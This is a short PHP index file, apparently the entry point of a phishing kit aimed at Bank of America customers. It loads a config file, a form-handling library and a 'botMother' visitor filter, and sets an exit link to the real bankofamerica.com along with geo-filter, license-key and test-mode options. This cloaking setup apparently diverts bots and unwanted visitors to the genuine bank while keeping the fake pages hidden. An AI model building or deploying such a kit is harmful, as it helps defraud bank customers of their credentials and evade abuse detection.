<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';

require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.bankofamerica.com/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);
$bm->run();



 

 

?>